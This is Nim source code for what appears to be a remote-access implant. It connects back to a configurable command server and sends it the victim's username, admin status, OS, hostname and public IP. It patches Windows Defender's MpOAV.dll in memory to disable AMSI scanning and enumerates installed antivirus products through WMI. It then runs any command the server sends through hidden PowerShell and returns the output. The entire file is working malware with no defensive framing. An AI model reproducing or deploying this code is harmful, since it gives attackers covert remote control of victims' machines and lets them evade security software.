import net
import base64
import winim/lean
import winim/inc/lm
import os, sequtils
import std/osproc
import strutils
import strenc
import strformat
import winim/clr
from zippy import uncompress
import winim/com
import nativesockets
import httpclient



let ip = "INPUT_IP"
let patch_port = "INPUT_PORT"
var port = parseInt(patch_port)


var client: net.Socket = newSocket()
client.connect(ip,  Port(port))
echo "Trying to connect to: ",ip,":", port


proc inbound_comm(): string =
  var receivedMessage: string = client.recvLine(maxLength =446976)
  #var decoded_msg = decode(receivedMessage)
  return receivedMessage
  
  
var buffer = newString(UNLEN + 1)
var cb = DWORD buffer.len
GetUserNameA(&buffer, &cb)
buffer.setLen(cb - 1) # cb  including the terminating null character
echo "Running as: ", buffer
client.send(encode(buffer))

os.sleep(2000)

if os.isAdmin() == false:
  client.send(encode("0"))
else:
  client.send(encode("1"))




os.sleep(5000)
echo "OS: ", hostOS
client.send(encode(hostOS))

os.sleep(2000)

var hostname = getHostname()
echo fmt"Hostname: {hostname}"
client.send(encode(hostname))

os.sleep(2000)

const source = "http://ipv4.icanhazip.com" # Forces IPv4

var h_client = newHttpClient()
let response = h_client.getContent(source)
var result = response.strip()
echo fmt"Public IP: {result}"
client.send(encode(result))


when defined amd64:
    echo "[*] Running in x64 process"
    const patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
elif defined i386:
    echo "[*] Running in x86 process"
    const patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]

proc PatchAmsi(): bool =
    var
        amsi: HMODULE
        cs: pointer
        op: DWORD
        t: DWORD
        disabled: bool = false
 
    let filesInPath = toSeq(walkDir("C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\", relative=true))
    var length = len(filesInPath)
    # last dir == newest dir
    amsi = LoadLibrary(fmt"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\{filesInPath[length-1].path}\\MpOAV.dll")
    if amsi == 0:
        echo "[X] Failed to load MpOav.dll"
        return disabled
    cs = GetProcAddress(amsi,"DllGetClassObject")
    if cs == nil:
        echo "[X] Failed to get the address of 'DllGetClassObject'"
        return disabled

    if VirtualProtect(cs, patch.len, 0x40, addr op):
        echo "[*] Applying patch"
        copyMem(cs, unsafeAddr patch, patch.len)
        VirtualProtect(cs, patch.len, op, addr t)
        disabled = true

    return disabled

when isMainModule:
    var success = PatchAmsi()
    echo fmt"[*] AMSI disabled: {bool(success)}"
    


proc getAv*() : string =
    let wmisec = GetObject(r"winmgmts:{impersonationLevel=impersonate}!\\.\root\securitycenter2")
    for avprod in wmisec.execQuery("SELECT displayName FROM AntiVirusProduct\n"):
        result.add($avprod.displayName & "\n")
    result = result.strip(trailing = true)
    

while true:
  var message = inbound_comm()
  echo "C2: ", message

  if message == "exit":
    echo "[-] The server has terminated the session..."
    client.close()
    break
  elif message == "background":
    discard
  elif message == "persist":
    discard
  elif message == "help":
    discard
  elif message == "GetAV":
    var result = getAv()
    client.send(encode(result))
  else:
    try:
      var command = message
      var result = execProcess("powershell.exe -nop -w hidden -c " & command)
      client.send(encode(result))
    except OSError:
      echo "[-] An error occurred.. try again"
      client.send(encode("The command was not found on the system"))




  

client.close()